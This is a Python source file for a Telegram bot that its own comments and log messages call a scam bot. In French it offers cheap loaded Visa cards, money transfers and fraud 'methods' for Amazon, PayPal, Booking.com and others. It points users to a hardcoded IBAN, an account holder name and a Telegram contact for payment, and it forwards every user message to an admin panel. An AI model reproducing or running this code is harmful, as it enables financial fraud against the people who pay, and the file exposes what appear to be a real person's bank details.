#!/usr/bin/env python3
"""
Telegram Scam Bot - Admin Panel Version
With message logging and centralized IBAN
"""

import os
import logging
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ========== CONFIGURATION ==========
# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Get bot token from environment
BOT_TOKEN = os.getenv('BOT_TOKEN')

# ADMIN ID - PUT YOUR TELEGRAM USER ID HERE (get it from @userinfobot)
ADMIN_ID = 6669804585  # REPLACE WITH YOUR ACTUAL TELEGRAM ID!!!

# IBAN & Payment details (centralized)
PAYMENT_DETAILS = {
    'iban': 'DE48202208000040574891',
    'name': 'AYMEN NOUFA',
    'contact': '@de9avrai',
    'crypto_contact': '@de9avrai',
    'methods_contact': '@de9avrai'
}

# Storage for user messages (in production use a database)
user_messages = {}

# ========== ADMIN PANEL FUNCTIONS ==========
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show admin panel only to admin"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Access denied. Fuck off.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 View Statistics", callback_data='admin_stats')],
        [InlineKeyboardButton("📨 View User Messages", callback_data='admin_messages')],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🔄 Update IBAN/Payment", callback_data='admin_update')],
        [InlineKeyboardButton("🚫 Clear All Data", callback_data='admin_clear')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🛡️ *ADMIN PANEL*\n\n"
        f"Welcome back, Alpha.\n\n"
        f"*Current IBAN:* `{PAYMENT_DETAILS['iban']}`\n"
        f"*Account Name:* `{PAYMENT_DETAILS['name']}`\n"
        f"*Contact:* {PAYMENT_DETAILS['contact']}\n\n"
        f"*Total Users:* {len(user_messages)}\n"
        f"*Total Messages:* {sum(len(msgs) for msgs in user_messages.values())}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel buttons"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ You're not the admin, bitch.")
        return
    
    data = query.data
    
    if data == 'admin_stats':
        total_users = len(user_messages)
        total_messages = sum(len(msgs) for msgs in user_messages.values())
        
        stats_text = f"📊 *SCAM BOT STATISTICS*\n\n"
        stats_text += f"• Total Users: `{total_users}`\n"
        stats_text += f"• Total Messages: `{total_messages}`\n"
        stats_text += f"• Active Today: `{count_active_today()}`\n\n"
        stats_text += f"*Payment Details:*\n"
        stats_text += f"IBAN: `{PAYMENT_DETAILS['iban']}`\n"
        stats_text += f"Name: `{PAYMENT_DETAILS['name']}`\n"
        
        await query.edit_message_text(stats_text, parse_mode='Markdown')
    
    elif data == 'admin_messages':
        if not user_messages:
            await query.edit_message_text("📭 No messages received yet.")
            return
        
        messages_text = "📨 *RECENT USER MESSAGES*\n\n"
        for user_id, messages in list(user_messages.items())[-10:]:  # Last 10 users
            user_info = await context.bot.get_chat(user_id)
            username = f"@{user_info.username}" if user_info.username else f"User ID: {user_id}"
            messages_text += f"👤 *{username}* (Messages: {len(messages)})\n"
            for msg in messages[-3:]:  # Last 3 messages per user
                messages_text += f"   └ {msg}\n"
            messages_text += "\n"
        
        await query.edit_message_text(messages_text, parse_mode='Markdown')
    
    elif data == 'admin_update':
        keyboard = [
            [InlineKeyboardButton("💳 Update IBAN", callback_data='update_iban')],
            [InlineKeyboardButton("👤 Update Name", callback_data='update_name')],
            [InlineKeyboardButton("📞 Update Contact", callback_data='update_contact')],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data='admin_back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⚙️ *UPDATE PAYMENT DETAILS*\n\n"
            f"Current settings:\n"
            f"• IBAN: `{PAYMENT_DETAILS['iban']}`\n"
            f"• Name: `{PAYMENT_DETAILS['name']}`\n"
            f"• Contact: {PAYMENT_DETAILS['contact']}\n\n"
            f"Select what to update:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif data == 'admin_back':
        await admin_panel_callback(query, context)
    
    elif data == 'admin_clear':
        keyboard = [
            [InlineKeyboardButton("✅ Yes, clear all", callback_data='confirm_clear')],
            [InlineKeyboardButton("❌ No, cancel", callback_data='admin_back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⚠️ *DANGER ZONE*\n\n"
            "This will clear ALL user messages and statistics.\n"
            "This action cannot be undone!\n\n"
            "Are you sure you want to proceed?",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

def count_active_today():
    """Count users active today"""
    today = datetime.now().date()
    count = 0
    for messages in user_messages.values():
        if any(msg['date'].date() == today for msg in messages):
            count += 1
    return count

async def admin_panel_callback(query, context):
    """Show admin panel from callback"""
    keyboard = [
        [InlineKeyboardButton("📊 View Statistics", callback_data='admin_stats')],
        [InlineKeyboardButton("📨 View User Messages", callback_data='admin_messages')],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🔄 Update IBAN/Payment", callback_data='admin_update')],
        [InlineKeyboardButton("🚫 Clear All Data", callback_data='admin_clear')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🛡️ *ADMIN PANEL*\n\n"
        f"Welcome back, Alpha.\n\n"
        f"*Current IBAN:* `{PAYMENT_DETAILS['iban']}`\n"
        f"*Account Name:* `{PAYMENT_DETAILS['name']}`\n"
        f"*Contact:* {PAYMENT_DETAILS['contact']}\n\n"
        f"*Total Users:* {len(user_messages)}\n"
        f"*Total Messages:* {sum(len(msgs) for msgs in user_messages.values())}",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# ========== PAYMENT TEMPLATES ==========
def get_payment_message(amount=""):
    """Generate payment message with centralized details"""
    return f"""💳 *PAYMENT DETAILS* 💳

💰 Amount: {amount}

🏦 *BANK TRANSFER:*
IBAN: `{PAYMENT_DETAILS['iban']}`
Account Name: `{PAYMENT_DETAILS['name']}`

📸 Please send a screenshot after payment.

📞 *CONTACT FOR HELP:*
{PAYMENT_DETAILS['contact']}

⚠️ *IMPORTANT:*
• Include your username in transfer description
• Send screenshot to {PAYMENT_DETAILS['contact']}
• Delivery within 24 hours after confirmation"""

def get_crypto_message():
    """Generate crypto payment message"""
    return f"""₿ *CRYPTO PAYMENT* ₿

📊 Contact: {PAYMENT_DETAILS['crypto_contact']}

Send message to {PAYMENT_DETAILS['crypto_contact']} for:
• Wallet address (BTC/ETH/USDT)
• Current exchange rate
• Payment confirmation

⚠️ *NOTE:*
• Crypto payments are instant
• Include your username in payment
• Screenshot required for confirmation"""

def get_methods_message():
    """Generate methods message"""
    return f"""🛠️ *METHODS PURCHASE* 🛠️

Contact: {PAYMENT_DETAILS['methods_contact']}

Available methods:
• Fnac V2
• Booking.com
• BackMarket
• Amazon
• Airbnb
• PayPal methods

📞 Contact {PAYMENT_DETAILS['methods_contact']} for:
• Prices and availability
• Payment instructions
• Setup help"""

# ========== MAIN BOT FUNCTIONS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with 3 options"""
    user_id = update.effective_user.id
    
    # Store user info
    if user_id not in user_messages:
        user_messages[user_id] = []
    
    user_messages[user_id].append({
        'text': 'Started bot',
        'date': datetime.now()
    })
    
    # Send welcome message to admin when new user starts
    if len(user_messages[user_id]) == 1:  # First time user
        try:
            await context.bot.send_message(
                ADMIN_ID,
                f"🆕 *New User Started Bot*\n"
                f"User ID: `{user_id}`\n"
                f"Username: @{update.effective_user.username if update.effective_user.username else 'No username'}\n"
                f"Name: {update.effective_user.first_name}",
                parse_mode='Markdown'
            )
        except:
            pass
    
    keyboard = [
        [InlineKeyboardButton("💳 Cart Visa", callback_data='visa')],
        [InlineKeyboardButton("💰 Transfers", callback_data='transfer')],
        [InlineKeyboardButton("🛠️ Method", callback_data='method')]
    ]
    
    # Add admin button if user is admin
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🛡️ Admin Panel", callback_data='admin_panel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Bonjour ami, tu veux acheter une carte de crédit, effectuer des virements ou utiliser d'autres méthodes ?",
        reply_markup=reply_markup
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Store user action
    if user_id not in user_messages:
        user_messages[user_id] = []
    
    user_messages[user_id].append({
        'text': f'Clicked: {data}',
        'date': datetime.now()
    })
    
    # ADMIN PANEL ACCESS
    if data == 'admin_panel':
        if user_id == ADMIN_ID:
            await admin_panel_callback(query, context)
        else:
            await query.edit_message_text("❌ You're not the admin.")
        return
    
    # VISA OPTION
    if data == 'visa':
        keyboard = [
            [InlineKeyboardButton("💳 400 Euro pour 40", callback_data='400')],
            [InlineKeyboardButton("💳 500 Euro pour 50", callback_data='500')],
            [InlineKeyboardButton("💳 600 Euro pour 60", callback_data='600')],
            [InlineKeyboardButton("💳 700 Euro pour 70", callback_data='700')],
            [InlineKeyboardButton("💳 800 Euro pour 80", callback_data='800')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Quel montant souhaitez-vous que la carte Visa contienne en argent ?",
            reply_markup=reply_markup
        )
    
    # VISA AMOUNTS - Show payment details
    elif data in ['400', '500', '600', '700', '800']:
        amount = f"{data} Euro pour {int(data)//10}"
        await query.edit_message_text(
            get_payment_message(amount),
            parse_mode='Markdown'
        )
    
    # TRANSFERS OPTION
    elif data == 'transfer':
        keyboard = [
            [InlineKeyboardButton("Crypto", callback_data='crypto')],
            [InlineKeyboardButton("Virement", callback_data='virement')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Préférez-vous les transferts en cryptomonnaie ou les transferts Virement ?",
            reply_markup=reply_markup
        )
    
    # CRYPTO TRANSFER
    elif data == 'crypto':
        await query.edit_message_text(
            get_crypto_message(),
            parse_mode='Markdown'
        )
    
    # BANK TRANSFER
    elif data == 'virement':
        await query.edit_message_text(
            get_payment_message("Variable amount"),
            parse_mode='Markdown'
        )
    
    # METHOD OPTION
    elif data == 'method':
        keyboard = [
            [InlineKeyboardButton("Fnac V2", callback_data='fnac')],
            [InlineKeyboardButton("Booking", callback_data='booking')],
            [InlineKeyboardButton("BackMarket", callback_data='backmarket')],
            [InlineKeyboardButton("🎯 More Methods", callback_data='more_methods')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Choisissez une méthode :",
            reply_markup=reply_markup
        )
    
    # METHOD SUB-OPTIONS
    elif data in ['fnac', 'booking', 'backmarket', 'more_methods']:
        await query.edit_message_text(
            get_methods_message(),
            parse_mode='Markdown'
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Store all user messages and forward to admin"""
    user_id = update.effective_user.id
    message_text = update.message.text
    
    # Don't store commands
    if message_text.startswith('/'):
        return
    
    # Store message
    if user_id not in user_messages:
        user_messages[user_id] = []
    
    user_messages[user_id].append({
        'text': message_text,
        'date': datetime.now()
    })
    
    # Forward to admin
    try:
        user_info = update.effective_user
        username = f"@{user_info.username}" if user_info.username else f"User ID: {user_id}"
        
        await context.bot.send_message(
            ADMIN_ID,
            f"📩 *New Message*\n\n"
            f"From: {username}\n"
            f"Name: {user_info.first_name}\n"
            f"User ID: `{user_id}`\n\n"
            f"Message:\n```\n{message_text}\n```\n\n"
            f"Total messages from user: {len(user_messages[user_id])}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to forward message to admin: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors and notify admin"""
    logger.error(f"Error: {context.error}")
    
    # Notify admin of critical errors
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"⚠️ *BOT ERROR*\n\n"
            f"Error: `{context.error}`\n"
            f"Update: `{update}`",
            parse_mode='Markdown'
        )
    except:
        pass

def main():
    """Start the bot"""
    if not BOT_TOKEN:
        logger.error("No BOT_TOKEN found in environment variables!")
        exit(1)
    
    if ADMIN_ID == 123456789:
        logger.error("⚠️ WARNING: You haven't set your ADMIN_ID!")
        logger.error("Get your Telegram ID from @userinfobot and update the code.")
    
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    # Start bot
    logger.info(f"🚀 Starting scam bot with admin features...")
    logger.info(f"🛡️ Admin ID: {ADMIN_ID}")
    logger.info(f"💳 IBAN: {PAYMENT_DETAILS['iban']}")
    logger.info(f"👤 Account Name: {PAYMENT_DETAILS['name']}")
    logger.info("✅ Bot is running! Ready to scam!")
    
    # Run with better error handling
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == '__main__':
    main()
